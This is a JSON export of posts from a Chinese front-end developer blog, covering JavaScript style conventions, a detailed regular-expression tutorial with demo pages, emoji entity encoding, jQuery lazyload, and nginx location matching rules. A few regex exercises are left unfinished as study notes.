thisIsMyName;2.常量全部大写，并使用下划线连接 eg. const MAX_COUNT = 10; 项目规范变量声明尽量提在函数首部，用一个var声明，不允许出现连着的两个var声明(也包括let，const) 1234567891011function doSomethingWithItems(items) &#123; // use one var var value = 10, result = value + 10, i, len; for (i = 0, len = items.length; i &lt; len; i++) &#123; result += 10; &#125;&#125; undefind使用规范（永远不要直接使用undefined进行变量判断，使用typeof和字符串’undefined’对变量进行判断。） 123456789// not goodif (person === undefined) &#123; ...&#125;// goodif (typeof person === 'undefined') &#123; ...&#125; 用’===’和’!==’代替’==’, ‘!=’使用对象的属性简写123456789const job = 'FrontEnd'// badconst item = &#123; job: job&#125;// goodconst item = &#123; job&#125; 使用拓展运算符 … 复制数组1234567891011// badconst items = []const itemsCopy = []const len = items.lengthlet i// badfor (i = 0; i &lt; len; i++) &#123; itemsCopy[i] = items[i]&#125;// gooditemsCopy = [...items] render使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051render: (h, params) =&gt; &#123; return h('div', [ h('span', &#123; attrs: &#123; class: \"table_details\" &#125;, on: &#123; click: () =&gt; &#123; this.edit(params.index) &#125; &#125; &#125;,), h('span', &#123; attrs: &#123; class: \"table_continue\" &#125;, on: &#123; click: () =&gt; &#123; this.show(params.index) &#125; &#125; &#125;,), h('span', &#123; attrs: &#123; class: \"table_more no_border_right\" &#125;, on: &#123; click: () =&gt; &#123; this.remove(params.row.id) &#125; &#125; &#125;,), h('Poptip', &#123; props: &#123; title:\"项目变更\", content:\"项目迁出\", placement:\"bottom-end\" &#125;, on: &#123; 'on-ok': () =&gt; &#123; &#125; &#125; &#125;, [ h('span', &#123; attrs: &#123; class: \"table_more no_border_right\" &#125; &#125;) ]) ])&#125; 文档：有时间整理一下http://taobaofed.org/blog/2017/01/05/writing-readable-code/","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"}]},{"title":"flex水平垂直居中","slug":"2018-04-flex水平垂直居中","date":"2018-04-11T10:30:39.000Z","updated":"2018-10-24T09:30:10.561Z","comments":true,"path":"note/7db1780c.html","link":"","permalink":"https://ru23.com/note/7db1780c.html","excerpt":"","text":"12345.box &#123; display: flex; align-items: center;/*垂直居中*/ justify-content: center;/*水平居中*/&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"正则回顾总结","slug":"2018-04-js-reg-review","date":"2018-04-10T02:09:43.000Z","updated":"2018-10-24T03:46:02.485Z","comments":true,"path":"note/d4f8fa93.html","link":"","permalink":"https://ru23.com/note/d4f8fa93.html","excerpt":"","text":"一、简介1.1 正则表达式的web常见场合 邮箱验证 用户名验证 替换字符串某一部分 信息采集 用来分析有效的代码段 1.2 字符串应用正则 string.match(reg)正则查找字符串 string.search(reg) 正则查找位置 string.replace(reg,&#39;newstr&#39;)正则替换 string.split（reg）正则拆分 1.3 正则表达式3句话1.3.1 要找什么字符？（5中方法） 字面值 比如：hi就是找hi 字符的集合[abcd]匹配abdc任意一个 用范围来表示字符[0-9] [a-z][A-Z] 字符簇 就是系统为常用的字符集合创建的一个简写 例如：\\d 表示[0-9] \\w代表[0-9a-zA-Z_] \\s代表[\\t\\v\\f\\r\\n]（空白符） 补集的形式来表示字符集合 例如：[0-9] 补集 [^0-9] 对于字符簇只需把字母大写即可表示补集 \\d –&gt;\\D（非数字） \\w–&gt;\\W （代表a-z0-9A-Z之外的东西） \\s –&gt;\\S(代表非空白字符) 点代表 任意字符 (不包括换行符) 1.3.2 从哪里找,找到哪？ \\b单词边界 \\bhi从单词边界开始匹配hi \\B 单词的非边界 把单词的中间某一部分取出来 把中间含有hi的单词取出来 即hi不能再两端 ^ 从字符串的起始位置开始匹配 $匹配到字符串的额结束位置 1.3.3 找多少 *表示匹配0-无穷==等价(0,) +表示匹配1-无穷 ==等价(1,) ?表示[0,1] == 等价(0,1) a(n): 字符a准确出现n次 a(n,):字符a至少出现n次 a(n,m):n到m次 1.3 贪婪模式 个数修饰符默认是贪婪模式 尽量多找 是指在上面的个数修饰符后面加?，则为非贪婪模式，尽量少的找 模式： 以匹配为例默认情况 match找到一次就结束 能否告诉匹配过程 一直找 在全文范围内一直找 g 表示全局模式 global 找所有的 而不是就找一行就结束 i ignore 忽略大小写 s 单行模式（把整篇文章看成一行）js不支持单行模式 m 多行模式 二、语法2.1 基本元字符 . ： 匹配除了换行符之外的任何单个字符 \\ ： 在非特殊字符之前的反斜杠表示下一个字符是特殊的 |： 逻辑或操作符 [] ：定义一个字符集合，匹配字符集合中的一个字符，在字符集合里面像 .，\\这些字符都表示其本身 [^]：对上面一个集合取非 -：定义一个区间，例如[A-Z]，其首尾字符在 ASCII 字符集里面 2.2 数量元字符 {m,n} ：匹配前面一个字符至少 m 次至多 n 次重复，还有{m}表示匹配 m 次，{m,}表示至少 m 次 + ： 匹配前面一个表达式一次或者多次，相当于{1,}，记忆方式追加(+)，起码得有一次 * ： 匹配前面一个表达式零次或者多次，相当于{0,}，记忆方式乘法(*)，可以一次都没有 ? ： 单独使用匹配前面一个表达式零次或者一次，相当于 {0,1} 2.3 位置元字符 ^ ： 单独使用匹配表达式的开始 \\$： 匹配表达式的结束 \\b：匹配单词边界 \\B：匹配非单词边界 (?=p)：匹配 p 前面的位置 (?!p)：匹配不是 p 前面的位置 2.4 特殊元字符 \\d：[0-9]，表示一位数字，记忆方式 digit \\D：[^0-9]，表示一位非数字 \\s：[\\t\\v\\n\\r\\f]，表示空白符，包括空格，水平制表符（\\t），垂直制表符（\\v），换行符（\\n），回车符（\\r），换页符（\\f），记忆方式 space character \\S：[^\\t\\v\\n\\r\\f]，表示非空白符 \\w：[0-9a-zA-Z]，表示数字大小写字母和下划线，记忆方式 word \\W：[^0-9a-zA-Z]，表示非单词字符 2.5 标志字符 g : 全局搜索 记忆方式global i ：不区分大小写 记忆方式 ignore m ：多行搜索 三、match，test，exec，search的返回值3.1 match的用法在不加全局“g”的情况下 12345var str=\"wo shi zhong guo ren\";console.log(str.match(/o/));// 返回的结果是：[\"o\", index: 1, input: \"wo shi zhong guo ren\"]； 在加全局“g”的情况下 12345var str=\"wo shi zhong guo ren\";console.log(str.match(/o/g));返回的结果是：[\"o\", \"o\", \"o\"]； 3.2 exec的用法12345678var str=\"wo shi zhong guo ren\";var re=/o/;console.log(re.exec(str));// 返回的结果是：[\"o\", index: 1, input: \"wo shi zhong guo ren\"]；// exec返回的和match不加全局“g”’一样 3.3 test的用法1234567var str=\"wo shi zhong guo ren\";var re=/o/;console.log(re.test(str));// 返回的结果是：true（如果找不到返回的则是false） 3.4 search的用法 关于search用法其实很简单，它和indexOf是一样的，就是找到index，而且是从前往后数的。 123456var str=\"wo shi zhong guo ren\";var re=/o/;console.log(str.search(re));返回的结果是：1； 四、应用4.1 例1 在线演示 https://codepen.io/poetries/pen/xWMRxR 123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;正则-例子1&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配hi\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"正匹配单词hi\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配hi开头的单词但不是hi\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /hi/;//仅仅是看字符串中有没有hi alert(reg.test(cv));//满足 返回true 不满足 返回false &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\bhi\\b/;//正则测试单词hi alert(reg.test(cv));//满足 返回true 不满足 返回false &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\bhi\\b/;//正则测试hi开头的单词但不是hi alert(reg.test(cv));//满足 返回true 不满足 返回false &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.2 例2-要找什么字符串 在线演示 https://codepen.io/poetries/pen/oqmYNw 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;要找什么字符&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"找不好的数字\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"有没有数字\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"有没有大写字母\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"是否全为数字\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /[347]/;// 匹配347任意一个字符的集合[abcd] 匹配abdc任意一个 alert(reg.test(cv)); &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; //var reg = /[0123456789]/; //var reg = /[0-9]/;// 匹配有没有数字 var reg = /\\d/;// \\d 表示[0-9] alert(reg.test(cv)); &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /[A-Z]/;// 匹配有没有数字 alert(reg.test(cv)); &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /[^0-9]/;// 匹配非数字 0-9之外的字符 对于网上发布手机号之类的很有用 比如1300 把00换成OO 就没法认出 if(reg.test(cv))&#123; alert('有非数字存在'); &#125;else&#123; alert('全是数字'); &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.3 例3-从哪里开始匹配 在线演示 https://codepen.io/poetries/pen/jzdVOo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;74-从哪里开始匹配&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配hi\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配hi开头及hi开头的单词\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配hi开头的单词但不是hi\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配进行时的单词\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配un前缀的反义词\" onclick=\"t5();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配单词中间的hi部分\" onclick=\"t6();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配输入的名字是不是lisi\" onclick=\"t7();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /hi/;//仅仅是看字符串中有没有hi alert(reg.test(cv));//满足 返回true 不满足 返回false &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; //var reg = /\\bhi.+/;// 错误1 匹配hi开头的单词 ////var reg = /\\bhi\\w+/;// 错误2 var reg = /\\bhi\\w*/; alert(reg.exec(cv));//exec返回一个对象 没找到返回none &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\bhi/;//正则测试hi开头的单词但不是hi alert(reg.exec(cv));//exec返回一个对象 没找到返回none &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\b[\\w]+ing\\b/;//*表示匹配0-无穷 +表示匹配1-无穷 alert(reg.exec(cv)); &#125; function t5()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\bun[\\w]+\\b/;//匹配un前缀的反义词 alert(reg.exec(cv)); &#125; function t6()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\Bhi\\B/;//匹配单词中间的hi部分 alert(reg.exec(cv)); &#125; function t7()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /^lisi$/;//匹配输入的名字是不是lisi alert(reg.exec(cv)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.4 例4 正则应用字符串 在线演示 https://codepen.io/poetries/pen/dmaOPz 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;正则应用字符串&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"查找中间含有hi的单词\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"查找所有中间含有hi的单词\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"查找所有中间含有hi的单词，不区分大小写\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"替换JavaScript标签\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"把连接换成空连接\" onclick=\"t5();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"把每一行的结尾的数字换成#\" onclick=\"t6();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"替换goods中多余的O\" onclick=\"t7();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\Bhi\\B/;//查找中间含有hi的单词 alert(cv.match(reg)); &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\Bhi\\B/g;//查找所有中间含有hi的单词 alert(cv.match(reg)); &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\Bhi\\B/gi;//查找所有中间含有hi的单词 g是全局 i ignore 忽略大小写 alert(cv.match(reg)); &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /&lt;script.*&lt;\\/script&gt;/;//替换JavaScript标签 alert(cv.replace(reg,'哈哈哈')); &#125; function t5()&#123; var cont = document.getElementById('cont'); var cv = cont.value; /* . 代表任意,但不包括换行 可以用一对反义词来匹配所有. \\d\\D等 不能跨行（贪婪模式） */ var reg = /&lt;a[\\s]+[\\d\\D]*&lt;\\/a&gt;/; //正则替换链接 alert(cv.replace(reg,'&lt;a href=\"#\"&gt;文字&lt;/a&gt;')); &#125; function t6()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\d+$/gm;//把每一行的结尾的数字换成# m 多行模式 alert(cv.replace(reg,'#')); &#125; function t7()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /go&#123;3,&#125;?ds/;//替换goods中多余的O alert(cv.replace(reg,'goods')); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.5 例5-预查 在线演示 https://codepen.io/poetries/pen/MVLbwW 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;预查&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配进行时的单词\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"匹配进行时的单词的词根部分,正向预查\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"查找winxp,负向预查\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"找出un*系列单词的词根\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\b[\\w]+ing\\b/; alert(cv.match(reg)); &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\b[\\w]+(?=ing)/g;//匹配进行时的单词的词根部分 不要ing结尾 预查不消耗字符 alert(cv.match(reg)); &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\bwin(?!95)/g;//win98 win97 win95 win32 winxp win2003要求把win95过滤 alert(cv.match(reg)); &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; //var reg = /\\w+(?&lt;=un)/g;//找出un*系列单词的词根 js不支持向前正向预查 alert(cv.match(reg)); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.6 例6-反向引用 在线演示 https://codepen.io/poetries/pen/LdqbVL 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;反向引用&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"把连接换成空连接，保留文字\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /&lt;a[\\s]+[^&gt;]+&gt;([^&lt;&gt;]+)&lt;\\/a&gt;/; //链接表达式 这个一部分是子表达式 ([^&lt;&gt;]+) // alert(reg.exec(cv)); alert(cv.replace(reg,'&lt;a href=\"#\"\"&gt;$1&lt;/a&gt;')); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.7 例7-正则练习 在线演示 https://codepen.io/poetries/pen/dmaOYV 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;正则练习&lt;/title&gt; &lt;style type=\"text/css\"&gt; textarea&#123; width: 400px; height: 200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"1-找首尾相同的单词\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"2-手机号第4位到第七位换成*\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"3-统一空格\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"4-把名字中的,去掉\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"5-把aaabb换成ab\" onclick=\"t5();\"&gt;&lt;/p&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /\\b([\\w])[\\w]*\\1\\b/g;// \\1注意引用方式 [\\w]任意一个 [\\w]*任意多个 找首尾相同的单词 /** * *如何引用子表达式所匹配的结果？ * * 答： 在表达式内部 反向引用时 \\n来匹配第N个子表达式的结果 子表达式当成变量来传递时，$N来匹配第N个子表达式的匹配结果 * */ alert(cv.match(reg)); &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /(1(3|5|8|)\\d)\\d&#123;4&#125;(\\d&#123;4&#125;)/;//字表达式(3|5|8|) (\\d&#123;4&#125;) &#123;4&#125;代表任意4个 // alert(cv.match(reg));//打印结果18878553070，188，3070 alert(cv.replace(reg,'$1****$3'));//188****4070 &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /[ \\t\\u3000]+/g;//找空白符 第一个是半角的空格 \\s包含所有空白符 \\u3000表示 全角空格的16进制Unicode编码 alert(cv.replace(reg,','));// &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /([\\u4E00-\\u9FA0]),([\\u4E00-\\u9FA0])/g; // 找中文用Unicode编码表的中文范围 alert(cv.replace(reg,',')); &#125; function t5()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = //; alert(cv.replace(reg,',')); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.8 例8-常用正则 在线演示 https://codepen.io/poetries/pen/GxzNoG 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;常用正则解答&lt;/title&gt; &lt;script type=\"text/javascript\"&gt; function t1()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /(\\w)\\1+/g; //查找连续多个字符 把aaabbccdd换成abcd这个格式 /**\\1 后向引用，表示表达式中，从左往右数，第一个左括号对应的括号内的内容。 以此类推，\\2表示第二个，\\0表示整个表达式**/ alert(cv.replace(reg,'$1')); &#125; function t2()&#123; var cont = document.getElementById('cont'); var cv = cont.value; //手机号正则： //1开头 //358第二位 //后九位 var reg = /1[358]\\d&#123;9&#125;/g; // 这种情况适合在一段文本中分析出手机号 alert(cv.match(reg));//分析手机号 &#125; function t3()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /^1[358]\\d&#123;9&#125;$/g; alert(reg.test(cv));// test 验证手机号 &#125; function t4()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /^\\s+|\\s+$/g; // | 并列 或者 去除两端空格 alert('--'+cv.replace(reg,'')+'--'); &#125; //借助正则限制在一个有限范围内 防止sql注入 function t5()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /^[\\w\\u4E00-\\u9FA0]&#123;4,16&#125;$/; // \\u4E00-\\u9FA0 中文对应的Unicode编码 验证由字母数字下划线中文组合的4-16位用户名 alert(reg.test(cv)); &#125; function t6()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = /^[0-9a-zA-Z]\\w*(\\.[\\w]+)*@[0-9a-zA-Z\\-]+(\\.[\\w]+)+$/; alert(reg.test(cv)); &#125; function t7()&#123; var cont = document.getElementById('cont'); var cv = cont.value; var reg = //; alert(cv.replace(reg,'')); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;textarea id='cont'&gt;&lt;/textarea&gt; &lt;p&gt;&lt;input type=\"button\" value=\"1-替换相同字符串\" onclick=\"t1();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"2-分析出手机号\" onclick=\"t2();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"3-验证手机号\" onclick=\"t3();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"4-去除两端空格\" onclick=\"t4();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"5-验证由字母数字下划线中文组合的4-16位用户名\" onclick=\"t5();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"6-验证邮箱\" onclick=\"t6();\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"button\" value=\"7-清空script代码\" onclick=\"t7();\"&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 五、总结 六、扩展阅读 梳理常用的正则表达式 一些总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://ru23.com/tags/正则表达式/"}]},{"title":"emoji表情存储后台报错的问题","slug":"2018-03-emoji表情存储后台报错的问题","date":"2018-03-29T08:54:07.000Z","updated":"2018-10-24T03:46:02.411Z","comments":true,"path":"note/a79ce8b4.html","link":"","permalink":"https://ru23.com/note/a79ce8b4.html","excerpt":"","text":"123456789101112131415161718192021/** * 用于把用utf16编码的字符转换成实体字符，以供后台存储* @param &#123;string&#125; str 将要转换的字符串，其中含有utf16字符将被自动检出* @return &#123;string&#125; 转换后的字符串，utf16字符将被转换成&amp;#xxxx;形式的实体字符*/utf16toEntities(str) &#123; var patt = /[\\ud800-\\udbff][\\udc00-\\udfff]/g; // 检测utf16字符正则 str = str.replace(patt, function(char) &#123; var H, L, code; if (char.length === 2) &#123; H = char.charCodeAt(0); // 取出高位 L = char.charCodeAt(1); // 取出低位 code = (H - 0xD800) * 0x400 + 0x10000 + L - 0xDC00; // 转换算法 return \"&amp;#\" + code + \";\"; &#125; else &#123; return char; &#125; &#125;); return str;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"lazyload页面中间有滚动条，滑动鼠标无法触发图片预加载","slug":"2018-03-lazyload页面中间有滚动条，滑动鼠标无法触发图片预加载","date":"2018-03-22T08:55:50.000Z","updated":"2018-10-24T03:46:02.414Z","comments":true,"path":"note/79c56a00.html","link":"","permalink":"https://ru23.com/note/79c56a00.html","excerpt":"","text":"图片在容器里面你可以将插件用在可滚动容器的图片上, 例如带滚动条的 DIV 元素. 你要做的只是将容器定义为 jQuery 对象并作为参数传到初始化方法里面.css代码1234# container &#123; height: 600px; overflow: scroll;&#125; Javascript代码1234$(\"img\").lazyload(&#123; placeholder: \"img/grey.gif\", container: $(\"#container\")&#125;);","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"nginx之location的匹配规则","slug":"2018-02-nginx-location-match-rules","date":"2018-02-28T05:01:42.000Z","updated":"2018-10-24T03:46:02.354Z","comments":true,"path":"note/e5e3e139.html","link":"","permalink":"https://ru23.com/note/e5e3e139.html","excerpt":"","text":"一、语法规则1location [=|~|~*|^~] /uri/ &#123; … &#125; 符号 含义 = 开头表示精确匹配 ^~ 开头表示 uri 以某个常规字符串开头，理解为匹配 url 路径即可。nginx 不对 url 做编码，因此请求为/static/20%/aa，可以被规则^~ /static/ /aa匹配到（注意是空格） ~ 开头表示区分大小写的正则匹配 ~* 开头表示不区分大小写的正则匹配 / 通用匹配，任何请求都会匹配到 多个 location 配置的情况下匹配顺序为 首先匹配 = 其次匹配 ^~ 其次是按文件中顺序的正则匹配 最后是交给 / 通用匹配 当有匹配成功时候，停止匹配，按当前匹配规则处理请求 123456789101112131415161718location = / &#123; #规则A&#125;location = /login &#123; #规则B&#125;location ^~ /static/ &#123; #规则C&#125;location ~ \\.(gif|jpg|png|js|css)$ &#123; #规则D&#125;location ~* \\.png$ &#123; #规则E&#125;location / &#123; #规则F&#125; 那么产生的效果如下 访问根目录 /， 比如 http://localhost/ 将匹配规则 A 访问 http://localhost/login 将匹配规则 B，http://localhost/register 则匹配规则 F 访问 http://localhost/static/a.html 将匹配规则 C 访问 http://localhost/a.gif, http://localhost/b.jpg 将匹配规则 D和规则 E，但是规则 D 顺序优先，规则 E不起作用，而 http://localhost/static/c.png则优先匹配到规则 C 访问 http://localhost/a.PNG 则匹配规则 E，而不会匹配规则 D，因为规则 E 不区分大小写 访问 http://localhost/category/id/1111 则最终匹配到规则 F，因为以上规则都不匹配，这个时候应该是 nginx 转发请求给后端应用服务器，比如 FastCGI（PHP），tomcat（jsp），nginx 作为反向代理服务器存在 二、运用场景 实际使用中，至少有三个匹配规则定义，如下 12345678910111213141516171819202122# 直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理，官网如是说。# 这里是直接转发给后端应用服务器了，也可以是一个静态首页# 第一个必选规则location = / &#123; proxy_pass http://tomcat:8080/index&#125;# 第二个必选规则是处理静态文件请求，这是 nginx 作为 http 服务器的强项# 有两种配置模式，目录匹配或后缀匹配，任选其一或搭配使用location ^~ /static/ &#123; root /webroot/static/;&#125;location ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ &#123; root /webroot/res/;&#125;# 第三个规则就是通用规则，用来转发动态请求到后端应用服务器# 非静态文件请求就默认是动态请求，自己根据实际把握# 毕竟目前的一些框架的流行，带.php、.jsp后缀的情况很少了location / &#123; proxy_pass http://tomcat:8080/&#125;","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://ru23.com/tags/Nginx/"}]},{"title":"HTTP协议系列（一）","slug":"2018-02-http-1","date":"2018-02-26T15:20:43.000Z","updated":"2018-10-24T03:46:02.344Z","comments":true,"path":"note/4d5369c2.html","link":"","permalink":"https://ru23.com/note/4d5369c2.html","excerpt":"","text":"一 、基础概念1.1 Web 基础 HTTP（HyperText Transfer Protocol，超文本传输协议）。 WWW（World Wide 